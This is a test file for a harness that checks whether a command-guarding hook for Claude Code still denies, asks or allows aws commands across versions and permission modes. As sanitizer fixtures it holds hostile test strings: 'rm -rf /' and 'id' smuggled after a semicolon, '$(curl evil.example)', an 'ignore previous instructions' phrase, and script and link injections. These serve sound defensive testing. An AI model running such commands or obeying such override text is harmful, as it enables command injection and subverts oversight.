import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  ASK_COMMAND,
  CASES,
  classify,
  compareVersions,
  evaluate,
  evaluateAsk,
  ISSUE_TITLE,
  legStatus,
  mergeLegs,
  parseAuditLog,
  parseHookLog,
  planActions,
  renderReport,
  sanitizeLeg,
  sanitizeMatrix,
  selectSdk,
  selectVersions,
  summaryTable,
  withMissing,
  type Case,
  type CheckResult,
  type LegResult,
  type Mode,
  type Observation,
  type ToolResult,
} from "../scripts/compat/lib";
import { startMockApi } from "../scripts/compat/mock_api";

const ROOT = join(import.meta.dir, "..");
const byId = (id: Case["id"]) => CASES.find((c) => c.id === id)!;

describe("selectVersions", () => {
  const published = ["2.1.294", "2.1.295", "2.1.296", "2.1.299", "2.1.300", "2.1.302", "2.1.303", "2.1.304-beta.1", "next"];

  test("minimum, the release before latest, and latest", () => {
    expect(selectVersions(published, "2.1.295", "2.1.303")).toEqual([
      { version: "2.1.295", labels: ["minimum"] },
      { version: "2.1.302", labels: ["previous"] },
      { version: "2.1.303", labels: ["latest"] },
    ]);
  });

  test("compares numerically, not as text", () => {
    expect(compareVersions("2.1.9", "2.1.10")).toBeLessThan(0);
    expect(compareVersions("2.2.0", "2.1.99")).toBeGreaterThan(0);
    expect(compareVersions("2.1.5", "2.1.5")).toBe(0);
    const v = selectVersions(["2.1.9", "2.1.10", "2.1.11"], "2.1.9", "2.1.11");
    expect(v.map((s) => s.version)).toEqual(["2.1.9", "2.1.10", "2.1.11"]);
  });

  test("merges labels when versions coincide", () => {
    expect(selectVersions(published, "2.1.302", "2.1.303")).toEqual([
      { version: "2.1.302", labels: ["minimum", "previous"] },
      { version: "2.1.303", labels: ["latest"] },
    ]);
    expect(selectVersions(["2.1.295", "2.1.296"], "2.1.296", "2.1.296")).toEqual([
      { version: "2.1.295", labels: ["previous"] },
      { version: "2.1.296", labels: ["minimum", "latest"] },
    ]);
  });

  test("ignores a pre-release that sorts after latest", () => {
    expect(selectVersions(published, "2.1.295", "2.1.303").map((s) => s.version)).not.toContain("2.1.304-beta.1");
  });

  test.each([
    ["a minimum that is not x.y.z", ["2.1.303"], "2.1", "2.1.303"],
    ["a minimum that is not published", ["2.1.302", "2.1.303"], "2.1.295", "2.1.303"],
    ["a latest that is not published", ["2.1.295", "2.1.302"], "2.1.295", "2.1.303"],
    ["a latest with shell syntax", ["2.1.295"], "2.1.295", "2.1.295; rm -rf /"],
    ["no release before latest", ["2.1.295"], "2.1.295", "2.1.295"],
  ])("rejects %s", (_name, published, minimum, latest) => {
    expect(() => selectVersions(published, minimum, latest)).toThrow();
  });
});

describe("parseHookLog", () => {
  const line = (o: object) => JSON.stringify(o);

  test("reads one JSON document per line and ignores junk and other tools", () => {
    const log = [
      line({ tool_name: "Bash", tool_input: { command: "ls" }, permission_mode: "default" }),
      "",
      "not json",
      line({ tool_name: "Edit", tool_input: { file_path: "/x" }, permission_mode: "default" }),
      line({ tool_input: { command: "no tool name" } }),
    ].join("\n");
    expect(parseHookLog(log)).toEqual([
      { command: "ls", permissionMode: "default" },
      { command: "no tool name", permissionMode: undefined },
    ]);
  });
});

describe("parseAuditLog", () => {
  test("skips non-JSON lines, such as error text from a broken hook", () => {
    const log = `{"decision":"allow","cmd":"aws s3 ls"}\naws_guard failed\n42\nnull\n`;
    expect(parseAuditLog(log)).toEqual([{ decision: "allow", cmd: "aws s3 ls" }]);
  });
});

const REASON = "Profile 'prod' is blocked (it matches the blocked profile pattern)";

// What a Claude Code that behaves as documented leaves behind for one command, with overrides.
function observed(
  c: Case,
  mode: Mode,
  o: { permissionMode?: string; audit?: string | null; reason?: string; ran?: boolean; hook?: boolean; result?: ToolResult | null; extraAudit?: boolean } = {},
): Observation {
  const permissionMode = "permissionMode" in o ? o.permissionMode : mode === "bypass" ? "bypassPermissions" : "default";
  const hook = o.hook === false ? [] : [{ tool_name: "Bash", tool_input: { command: c.command }, permission_mode: permissionMode }];
  const decision = "audit" in o ? o.audit : c.audit;
  const audit: object[] = decision ? [{ decision, reason: o.reason ?? (c.id === "deny" ? REASON : "Read-only aws call"), cmd: c.command }] : [];
  if (o.extraAudit) audit.push({ decision: "ask", cmd: "aws something else" });
  const ran = o.ran ?? c.executes;
  const result: ToolResult | undefined =
    o.result === null ? undefined : (o.result ?? (c.id === "deny" ? { isError: true, text: `PreToolUse hook blocked: ${REASON}` } : { isError: false, text: "" }));
  return {
    hookLog: hook.map((h) => JSON.stringify(h)).join("\n"),
    auditLog: audit.map((a) => JSON.stringify(a)).join("\n"),
    shimLog: ran ? `${c.command.replace(/^aws /, "")}\n` : "",
    toolResult: result,
  };
}

describe("evaluate", () => {
  test.each(CASES.flatMap((c) => (["normal", "bypass"] as Mode[]).map((m) => [c.id, m] as const)))(
    "documented behavior passes: %s in %s mode",
    (id, mode) => {
      const c = byId(id);
      expect(evaluate(c, mode, observed(c, mode))).toEqual({ mode, id, status: "pass", failed: [] });
    },
  );

  test("a call Claude Code never reported on is a harness error, not a failure", () => {
    const c = byId("deny");
    expect(evaluate(c, "bypass", observed(c, "bypass", { result: null }))).toEqual({ mode: "bypass", id: "deny", status: "error", failed: [] });
  });

  test("a call that was processed but never reached the hook fails: the hook stopped running", () => {
    for (const mode of ["normal", "bypass"] as Mode[]) {
      const c = byId("deny");
      expect(evaluate(c, mode, observed(c, mode, { hook: false })).failed).toEqual(["hook_not_run"]);
    }
  });

  test("a reworded command is not the call under test", () => {
    const c = byId("allow");
    const o = observed(c, "normal");
    o.hookLog = JSON.stringify({ tool_name: "Bash", tool_input: { command: "aws s3 ls --profile test --region us-east-1" }, permission_mode: "default" });
    expect(evaluate(c, "normal", o).failed).toEqual(["hook_not_run"]);
  });

  test("bypass mode that is not reported as bypassPermissions fails", () => {
    const c = byId("allow");
    expect(evaluate(c, "bypass", observed(c, "bypass", { permissionMode: "default" })).failed).toEqual(["permission_mode"]);
  });

  test("normal mode reported as bypassPermissions, a missing or an unknown mode fails", () => {
    const c = byId("allow");
    for (const permissionMode of ["bypassPermissions", undefined, "somethingNew"]) {
      expect(evaluate(c, "normal", observed(c, "normal", { permissionMode })).failed).toEqual(["permission_mode"]);
    }
  });

  test.each(["default", "plan", "acceptEdits", "auto", "dontAsk"])("%s is a valid non-bypass mode", (permissionMode) => {
    const c = byId("allow");
    expect(evaluate(c, "normal", observed(c, "normal", { permissionMode })).status).toBe("pass");
  });

  test("a hard deny that executes anyway fails, in either mode", () => {
    const c = byId("deny");
    for (const mode of ["normal", "bypass"] as Mode[]) {
      expect(evaluate(c, mode, observed(c, mode, { ran: true })).failed).toEqual(["unexpected_execution"]);
    }
  });

  test("an ask that runs silently under bypass fails", () => {
    const c = byId("ask");
    expect(evaluate(c, "bypass", observed(c, "bypass", { ran: true }))).toEqual({ mode: "bypass", id: "ask", status: "fail", failed: ["unexpected_execution"] });
  });

  test("an allowed command that does not run fails", () => {
    const c = byId("allow");
    expect(evaluate(c, "normal", observed(c, "normal", { ran: false })).failed).toEqual(["missing_execution"]);
  });

  test("a wrong or missing audit decision fails", () => {
    const c = byId("deny");
    expect(evaluate(c, "bypass", observed(c, "bypass", { audit: "allow" })).failed).toEqual(["audit_decision"]);
    expect(evaluate(c, "bypass", observed(c, "bypass", { audit: null })).failed).toEqual(["audit_missing"]);
  });

  test("a non-aws command that gets an audit line fails", () => {
    const c = byId("passthrough");
    expect(evaluate(c, "normal", observed(c, "normal", { extraAudit: true })).failed).toEqual(["audit_unexpected"]);
  });

  test("the shim is only matched for aws commands", () => {
    const c = byId("passthrough");
    expect(evaluate(c, "normal", { ...observed(c, "normal"), shimLog: "hello\n" }).status).toBe("pass");
  });

  test("a denied call's reason has to reach Claude, as an error", () => {
    const c = byId("deny");
    for (const result of [
      { isError: true, text: "Blocked, no reason given" },
      { isError: false, text: REASON },
      { isError: true, text: "" },
    ]) {
      expect(evaluate(c, "bypass", observed(c, "bypass", { result })).failed).toEqual(["reason_not_shown"]);
    }
  });

  test("the reason is only checked when the audit log has one", () => {
    const c = byId("deny");
    const o = observed(c, "bypass", { result: { isError: true, text: "anything" } });
    o.auditLog = JSON.stringify({ decision: "deny", cmd: c.command });
    expect(evaluate(c, "bypass", o).status).toBe("pass");
  });

  test("several failures are all reported", () => {
    const c = byId("ask");
    const r = evaluate(c, "bypass", observed(c, "bypass", { permissionMode: "default", audit: "allow", ran: true }));
    expect(r.failed).toEqual(["permission_mode", "audit_decision", "unexpected_execution"]);
  });
});

describe("evaluateAsk", () => {
  const ask = byId("ask");

  test("an ask that reaches the permission callback and does not run passes, in both modes", () => {
    expect(evaluateAsk("bypass", observed(ask, "bypass"), [ASK_COMMAND])).toEqual({ mode: "bypass", id: "ask_prompt", status: "pass", failed: [] });
    expect(evaluateAsk("normal", observed(ask, "normal"), [ASK_COMMAND]).status).toBe("pass");
  });

  test("an ask that never reaches the callback fails", () => {
    expect(evaluateAsk("bypass", observed(ask, "bypass"), []).failed).toEqual(["no_prompt"]);
    expect(evaluateAsk("bypass", observed(ask, "bypass"), ["aws something else"]).failed).toEqual(["no_prompt"]);
  });

  test("an ask that ran although the callback denies it fails", () => {
    const ran = observed(ask, "bypass", { ran: true });
    expect(evaluateAsk("bypass", ran, [ASK_COMMAND]).failed).toEqual(["unexpected_execution"]);
    expect(evaluateAsk("bypass", ran, []).failed).toEqual(["no_prompt", "unexpected_execution"]);
  });

  test("a wrong permission_mode fails", () => {
    expect(evaluateAsk("bypass", observed(ask, "bypass", { permissionMode: "default" }), [ASK_COMMAND]).failed).toEqual(["permission_mode"]);
    expect(evaluateAsk("normal", observed(ask, "normal", { permissionMode: "bypassPermissions" }), [ASK_COMMAND]).failed).toEqual(["permission_mode"]);
  });

  test("a call that never reached the hook fails; one never reported on is a harness error", () => {
    expect(evaluateAsk("bypass", observed(ask, "bypass", { hook: false }), [ASK_COMMAND]).failed).toEqual(["hook_not_run"]);
    expect(evaluateAsk("bypass", observed(ask, "bypass", { result: null }), []).status).toBe("error");
  });
});

describe("selectSdk", () => {
  const listing = [
    { version: "0.3.294", claudeCodeVersion: "2.1.294" },
    { version: "0.3.295", claudeCodeVersion: "2.1.295" },
    { version: "0.3.296", claudeCodeVersion: "2.1.295" },
    { version: "0.3.297; id", claudeCodeVersion: "2.1.297" },
    { version: "0.3.298" },
    null,
  ];

  test("finds the SDK release that bundles a Claude Code version, the newest if several do", () => {
    expect(selectSdk(listing, "2.1.294")).toBe("0.3.294");
    expect(selectSdk(listing, "2.1.295")).toBe("0.3.296");
  });

  test("returns undefined when none matches or the version isn't plain", () => {
    expect(selectSdk(listing, "2.1.299")).toBeUndefined();
    expect(selectSdk(listing, "2.1.297")).toBeUndefined();
  });

  test("npm prints a single object, not a list, when one version matches", () => {
    expect(selectSdk({ version: "0.3.303", claudeCodeVersion: "2.1.303" }, "2.1.303")).toBe("0.3.303");
    expect(selectSdk(undefined, "2.1.303")).toBeUndefined();
  });
});

describe("legStatus", () => {
  const check = (status: CheckResult["status"]): CheckResult => ({ mode: "normal", id: "allow", status, failed: [] });
  const leg = (statuses: CheckResult["status"][], error?: LegResult["error"]): LegResult => ({
    version: "2.1.303",
    labels: ["latest"],
    checks: statuses.map(check),
    error,
  });

  test("all pass is a pass", () => {
    expect(legStatus(leg(["pass", "pass"]))).toBe("pass");
  });

  test("any failure is a failure, even next to harness errors", () => {
    expect(legStatus(leg(["pass", "fail"]))).toBe("fail");
    expect(legStatus(leg(["fail", "error"], "claude_failed"))).toBe("fail");
  });

  test("a harness error, or no checks at all, is an error", () => {
    expect(legStatus(leg(["pass"], "version_mismatch"))).toBe("error");
    expect(legStatus(leg(["pass", "error"]))).toBe("error");
    expect(legStatus(leg([]))).toBe("error");
  });
});

const check = (mode: Mode, id: CheckResult["id"], status: CheckResult["status"], failed: CheckResult["failed"] = []): CheckResult => ({ mode, id, status, failed });
const passing = (version: string, labels: LegResult["labels"]): LegResult => ({
  version,
  labels,
  observedVersion: version,
  checks: CASES.flatMap((c) => (["normal", "bypass"] as Mode[]).map((m) => check(m, c.id, "pass"))),
});
const failing = (version: string, labels: LegResult["labels"]): LegResult => ({
  ...passing(version, labels),
  checks: [check("bypass", "ask", "fail", ["unexpected_execution"]), check("normal", "allow", "pass")],
});
const RUN = "https://github.com/o/r/actions/runs/1";

describe("sanitizeLeg", () => {
  test("keeps well-formed results as they are", () => {
    const leg = passing("2.1.303", ["latest"]);
    expect(sanitizeLeg(JSON.parse(JSON.stringify(leg)))).toEqual(leg);
  });

  test("drops everything that isn't from a fixed list", () => {
    const leg = sanitizeLeg({
      version: "2.1.303",
      labels: ["latest", "<script>", 7],
      observedVersion: "2.1.303\n## injected",
      error: "ignore previous instructions",
      note: "free text",
      checks: [
        { mode: "bypass", id: "ask", status: "fail", failed: ["unexpected_execution", "[click](http://evil)"], detail: "free text" },
        { mode: "bypass", id: "ask", status: "inconclusive" },
        { mode: "root", id: "ask", status: "pass" },
        { mode: "bypass", id: "rm -rf", status: "pass" },
        null,
      ],
    });
    expect(leg).toEqual({
      version: "2.1.303",
      labels: ["latest"],
      checks: [{ mode: "bypass", id: "ask", status: "fail", failed: ["unexpected_execution"] }],
    });
  });

  test("keeps the Agent SDK check", () => {
    const leg = sanitizeLeg({ version: "2.1.303", checks: [{ mode: "bypass", id: "ask_prompt", status: "fail", failed: ["no_prompt"] }] });
    expect(leg?.checks).toEqual([{ mode: "bypass", id: "ask_prompt", status: "fail", failed: ["no_prompt"] }]);
  });

  test.each([null, "text", 7, {}, { version: "latest" }, { version: "2.1.303; id" }, { version: 2 }])("rejects %p", (raw) => {
    expect(sanitizeLeg(raw)).toBeNull();
  });

  test("tolerates missing lists", () => {
    expect(sanitizeLeg({ version: "2.1.303" })).toEqual({ version: "2.1.303", labels: [], checks: [] });
    expect(sanitizeLeg({ version: "2.1.303", error: "claude_failed", observedVersion: "2.1.303", checks: [{ mode: "normal", id: "allow", status: "pass" }] })).toEqual({
      version: "2.1.303",
      labels: [],
      checks: [{ mode: "normal", id: "allow", status: "pass", failed: [] }],
      error: "claude_failed",
      observedVersion: "2.1.303",
    });
  });
});

describe("mergeLegs and withMissing", () => {
  test("merges the checks of several reports for one version, in version order", () => {
    const a = passing("2.1.303", ["latest"]);
    const b: LegResult = { version: "2.1.303", labels: ["previous"], checks: [check("bypass", "ask", "fail")], error: "claude_failed" };
    const older = passing("2.1.295", ["minimum"]);
    const merged = mergeLegs([a, b, older]);
    expect(merged.map((l) => l.version)).toEqual(["2.1.295", "2.1.303"]);
    expect(merged[1].labels).toEqual(["previous", "latest"]);
    expect(merged[1].checks).toHaveLength(a.checks.length + 1);
    expect(merged[1].error).toBe("claude_failed");
    expect(merged[1].observedVersion).toBe("2.1.303");
  });

  test("does not change its input", () => {
    const a = passing("2.1.303", ["latest"]);
    mergeLegs([a, a]);
    expect(a.checks).toHaveLength(8);
  });

  test("a version that left no results becomes an error leg", () => {
    const legs = withMissing([passing("2.1.303", ["latest"])], [
      { version: "2.1.295", labels: ["minimum"] },
      { version: "2.1.303", labels: ["latest"] },
    ]);
    expect(legs.map((l) => [l.version, legStatus(l)])).toEqual([["2.1.295", "error"], ["2.1.303", "pass"]]);
    expect(legs[0].error).toBe("no_results");
  });
});

describe("sanitizeMatrix", () => {
  test("reads the versions job's output", () => {
    const raw = JSON.stringify({ include: [{ version: "2.1.295", labels: "minimum" }, { version: "2.1.303", labels: "previous,latest,bogus" }] });
    expect(sanitizeMatrix(raw)).toEqual([
      { version: "2.1.295", labels: ["minimum"] },
      { version: "2.1.303", labels: ["previous", "latest"] },
    ]);
  });

  test("an unreadable matrix, or bad entries, give nothing", () => {
    expect(sanitizeMatrix(undefined)).toEqual([]);
    expect(sanitizeMatrix("")).toEqual([]);
    expect(sanitizeMatrix("{}")).toEqual([]);
    expect(sanitizeMatrix(JSON.stringify({ include: [{ version: "x; y" }, { version: "2.1.1" }, null] }))).toEqual([{ version: "2.1.1", labels: [] }]);
  });
});

describe("classify", () => {
  const three = (min: LegResult, prev: LegResult, latest: LegResult) => [min, prev, latest];

  test("all passing", () => {
    expect(classify(three(passing("2.1.295", ["minimum"]), passing("2.1.302", ["previous"]), passing("2.1.303", ["latest"])))).toBe("All legs pass.");
  });

  test("only latest failing points at upstream", () => {
    const text = classify(three(passing("2.1.295", ["minimum"]), passing("2.1.302", ["previous"]), failing("2.1.303", ["latest"])));
    expect(text).toContain("Only the latest release fails");
  });

  test("the minimum failing is called out first", () => {
    const text = classify(three(failing("2.1.295", ["minimum"]), passing("2.1.302", ["previous"]), failing("2.1.303", ["latest"])));
    expect(text).toContain("declared minimum");
  });

  test("a lone failing latest with only one leg is not blamed on upstream", () => {
    expect(classify([failing("2.1.303", ["latest"])])).toContain("More than the latest");
  });

  test("previous and latest failing is more than latest alone", () => {
    const text = classify(three(passing("2.1.295", ["minimum"]), failing("2.1.302", ["previous"]), failing("2.1.303", ["latest"])));
    expect(text).toContain("More than the latest");
  });
});

describe("report text", () => {
  const legs = [passing("2.1.295", ["minimum"]), failing("2.1.303", ["latest"])];

  test("the table has a row per check and a column per version", () => {
    const table = summaryTable(legs);
    expect(table).toContain("| Check | 2.1.295 (minimum) | 2.1.303 (latest) |");
    expect(table).toContain("| `bypass/ask` | ✅ | ❌ |");
    expect(table).toContain("| `bypass/allow` | ✅ |  |");
    expect(table).toContain("| **Leg** | ✅ | ❌ |");
  });

  test("failures and harness errors are spelled out from fixed text", () => {
    const withError: LegResult = { version: "2.1.295", labels: [], checks: [], error: "claude_failed" };
    const text = renderReport([withError, failing("2.1.303", ["latest"])], RUN);
    expect(text).toContain("`bypass/ask`: the command ran, but must not have");
    expect(text).toContain("**2.1.295 (unlabeled)**");
    expect(text).toContain("never reported back on the call");
    expect(text.trim().endsWith(`Run: ${RUN}`)).toBe(true);
  });

  test("every failure code and error code has text", () => {
    const text = renderReport(
      [
        {
          version: "2.1.303",
          labels: ["latest"],
          checks: [
            check("bypass", "deny", "fail", ["hook_not_run", "permission_mode", "audit_decision", "audit_missing", "audit_unexpected", "unexpected_execution", "missing_execution", "reason_not_shown", "no_prompt"]),
          ],
        },
        { version: "2.1.302", labels: ["previous"], checks: [], error: "version_mismatch" },
        { version: "2.1.301", labels: [], checks: [], error: "no_results" },
        { version: "2.1.300", labels: [], checks: [], error: "sdk_unavailable" },
      ],
      RUN,
    );
    expect(text).not.toContain("undefined");
    expect(text).toContain("never saw it");
    expect(text).toContain("isn't the requested version");
    expect(text).toContain("no results");
    expect(text).toContain("could not be loaded");
    expect(text).toContain("a user would not have been asked");
  });

  test("a clean report has no per-version notes", () => {
    expect(renderReport([passing("2.1.303", ["latest"])], RUN)).not.toContain("**2.1.303");
  });
});

describe("planActions", () => {
  const ok = [passing("2.1.303", ["latest"])];
  const bad = [failing("2.1.303", ["latest"])];

  test("a problem opens one issue", () => {
    const [a, ...rest] = planActions(bad, RUN, null);
    expect(rest).toEqual([]);
    expect(a).toMatchObject({ type: "create", title: ISSUE_TITLE });
  });

  test("a problem with an issue already open comments on it", () => {
    expect(planActions(bad, RUN, 9)).toEqual([{ type: "comment", number: 9, body: renderReport(bad, RUN) }]);
  });

  test("a clean run closes the open issue and says why", () => {
    const [comment, close] = planActions(ok, RUN, 9);
    expect(comment).toMatchObject({ type: "comment", number: 9 });
    expect((comment as { body: string }).body).toContain("Everything passes again.");
    expect(close).toEqual({ type: "close", number: 9 });
  });

  test("a clean run with nothing open does nothing", () => {
    expect(planActions(ok, RUN, null)).toEqual([]);
  });

  test("no results at all is a problem", () => {
    const [a] = planActions([], RUN, null);
    expect(a).toMatchObject({ type: "create" });
    expect((a as { body: string }).body).toContain("No results were produced.");
  });
});

// report.ts end to end in --dry-run mode, with hostile results: nothing from them may reach the output.
describe("report.ts", () => {
  const reportEnv = { ...process.env, GITHUB_REPOSITORY: "o/r", GITHUB_RUN_ID: "1", GITHUB_STEP_SUMMARY: "" };
  const runReport = async (dir: string, env: Record<string, string | undefined>) => {
    const proc = Bun.spawn(["bun", join(ROOT, "scripts", "compat", "report.ts"), dir, "--dry-run"], { env, stdout: "pipe", stderr: "pipe" });
    const [out, code] = await Promise.all([new Response(proc.stdout).text(), proc.exited]);
    return { out, code };
  };

  test("renders the run summary from fixed text only", async () => {
    const dir = mkdtempSync(join(tmpdir(), "compat-report-"));
    mkdirSync(join(dir, "compat-results-2.1.303"));
    writeFileSync(
      join(dir, "compat-results-2.1.303", "probe-2.1.303.json"),
      JSON.stringify({
        version: "2.1.303",
        labels: ["latest"],
        error: "$(curl evil.example)",
        checks: [{ mode: "bypass", id: "ask", status: "fail", failed: ["unexpected_execution", "@everyone"], detail: "@everyone" }],
      }),
    );
    writeFileSync(join(dir, "notes.txt"), "ignored");
    writeFileSync(join(dir, "broken.json"), "{ not json");
    const matrix = JSON.stringify({ include: [{ version: "2.1.295", labels: "minimum" }, { version: "2.1.303", labels: "latest" }] });
    const { out, code } = await runReport(dir, { ...reportEnv, MATRIX: matrix });
    expect(code).toBe(0);
    expect(out).toContain("`bypass/ask`: the command ran, but must not have");
    expect(out).toContain("2.1.295 (minimum)");
    expect(out).toContain("the job produced no results");
    expect(out).toContain("https://github.com/o/r/actions/runs/1");
    expect(out).not.toContain("evil");
    expect(out).not.toContain("@everyone");
    expect(out.trim().endsWith("create")).toBe(true);
  });

  test("an empty results directory is reported, not crashed on", async () => {
    const dir = mkdtempSync(join(tmpdir(), "compat-report-"));
    const { out, code } = await runReport(join(dir, "missing"), { ...reportEnv, MATRIX: "" });
    expect(code).toBe(0);
    expect(out).toContain("No results were produced.");
  });
});

// Claude Code's side of the conversation, as the mock API sees it.
describe("mock API", () => {
  const post = (url: string, body: object, path = "/v1/messages") =>
    fetch(url + path, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(body) });
  const user = { role: "user", content: "Run the command." };
  const tools = [{ name: "Read" }, { name: "Bash" }];
  const COMMAND = "aws s3 ls --profile test";

  test("asks for the scripted command first, as a streamed Bash tool call", async () => {
    const api = startMockApi(COMMAND);
    try {
      const text = await (await post(api.url, { model: "m", stream: true, tools, messages: [user] })).text();
      expect(text).toContain("event: message_start");
      expect(text).toContain('"type":"tool_use"');
      expect(text).toContain('"name":"Bash"');
      expect(text).toContain(JSON.stringify(JSON.stringify({ command: COMMAND, description: "Compatibility check" })).slice(1, -1));
      expect(text).toContain('"stop_reason":"tool_use"');
      expect(text.trim().endsWith('data: {"type":"message_stop"}')).toBe(true);
      expect(api.toolResult()).toBeUndefined();
    } finally {
      api.stop();
    }
  });

  test("records what came back, then says done", async () => {
    const api = startMockApi(COMMAND);
    try {
      const followUp = [
        user,
        { role: "assistant", content: [{ type: "tool_use", id: "toolu_compat", name: "Bash", input: {} }] },
        { role: "user", content: [{ type: "tool_result", tool_use_id: "toolu_compat", is_error: true, content: [{ type: "text", text: "blocked" }, { type: "image" }, { type: "text", text: "because" }] }] },
      ];
      const text = await (await post(api.url, { model: "m", stream: true, tools, messages: followUp })).text();
      expect(text).toContain('"text":"done"');
      expect(text).toContain('"stop_reason":"end_turn"');
      expect(text).not.toContain("tool_use");
      expect(api.toolResult()).toEqual({ isError: true, text: "blocked\n\nbecause" });
    } finally {
      api.stop();
    }
  });

  test("reads a plain string result, and an error flag that is absent", async () => {
    const api = startMockApi(COMMAND);
    try {
      const messages = [user, { role: "user", content: [{ type: "tool_result", tool_use_id: "toolu_compat", content: "ok" }] }];
      await post(api.url, { model: "m", tools, messages });
      expect(api.toolResult()).toEqual({ isError: false, text: "ok" });
    } finally {
      api.stop();
    }
  });

  test("ignores results for other tool calls, and results with no usable content", async () => {
    const api = startMockApi(COMMAND);
    try {
      const messages = [
        { role: "user", content: [{ type: "tool_result", tool_use_id: "toolu_other", content: "x" }] },
        { role: "user", content: "just text" },
        { role: "user", content: [null, { type: "text", text: "hello" }] },
      ];
      const body = await (await post(api.url, { model: "m", tools, messages })).json();
      expect(api.toolResult()).toBeUndefined();
      expect(body.content[0].type).toBe("tool_use");
      await post(api.url, { model: "m", tools, messages: [{ role: "user", content: [{ type: "tool_result", tool_use_id: "toolu_compat", content: 7 }] }] });
      expect(api.toolResult()).toEqual({ isError: false, text: "" });
    } finally {
      api.stop();
    }
  });

  test("answers without streaming when not asked to stream", async () => {
    const api = startMockApi(COMMAND);
    try {
      const body = await (await post(api.url, { model: "m", tools, messages: [user] })).json();
      expect(body).toMatchObject({ type: "message", role: "assistant", model: "m", stop_reason: "tool_use" });
      expect(body.content).toEqual([{ type: "tool_use", id: "toolu_compat", name: "Bash", input: { command: COMMAND, description: "Compatibility check" } }]);
    } finally {
      api.stop();
    }
  });

  test("a request without a Bash tool, or with no messages, just gets text", async () => {
    const api = startMockApi(COMMAND);
    try {
      const noBash = await (await post(api.url, { model: "m", tools: [{ name: "Read" }], messages: [user] })).json();
      expect(noBash.content).toEqual([{ type: "text", text: "done" }]);
      const bare = await (await post(api.url, {})).json();
      expect(bare.content).toEqual([{ type: "text", text: "done" }]);
    } finally {
      api.stop();
    }
  });

  test("answers the other endpoints Claude Code may call", async () => {
    const api = startMockApi(COMMAND);
    try {
      expect(await (await post(api.url, {}, "/v1/messages/count_tokens")).json()).toEqual({ input_tokens: 1 });
      expect(await (await post(api.url, {}, "/api/hello")).json()).toEqual({});
    } finally {
      api.stop();
    }
  });
});

describe("workflow and docs agree", () => {
  const workflow = readFileSync(join(ROOT, ".github", "workflows", "compat.yml"), "utf8");
  const readme = readFileSync(join(ROOT, "README.md"), "utf8");

  test("the workflow's minimum Claude Code is the one the README requires", () => {
    const min = workflow.match(/MIN_CLAUDE_CODE:\s*"?(\d+\.\d+\.\d+)/)?.[1];
    expect(min).toBeDefined();
    expect(readme).toContain(`**Claude Code ${min} or later.**`);
  });

  test("the workflow holds no secrets and never runs with a pull request's privileges", () => {
    // A mock API stands in for the model, so there is nothing to protect. Keep it that way: it runs on
    // pull requests, forks included, and a secret here would be readable by their code.
    const active = workflow.split("\n").filter((l) => !l.trim().startsWith("#")).join("\n");
    expect(active).not.toMatch(/secrets\./);
    expect(active).not.toMatch(/ANTHROPIC_API_KEY/);
    expect(active).not.toMatch(/pull_request_target/);
    expect(active).not.toMatch(/^\s*environment:/m);
  });

  test("the job that can write issues doesn't run on pull requests", () => {
    const report = workflow.slice(workflow.indexOf("\n  report:"));
    expect(report).toContain("issues: write");
    expect(report).toContain("github.event_name != 'pull_request'");
    expect(workflow.slice(0, workflow.indexOf("\n  report:"))).not.toContain("issues: write");
  });

  test("the harness can still find the hook group it extends in examples/settings.json", () => {
    const settings = JSON.parse(readFileSync(join(ROOT, "examples", "settings.json"), "utf8"));
    expect(settings.hooks.PreToolUse[0].matcher).toBe("Bash");
    expect(Array.isArray(settings.hooks.PreToolUse[0].hooks)).toBe(true);
  });
});
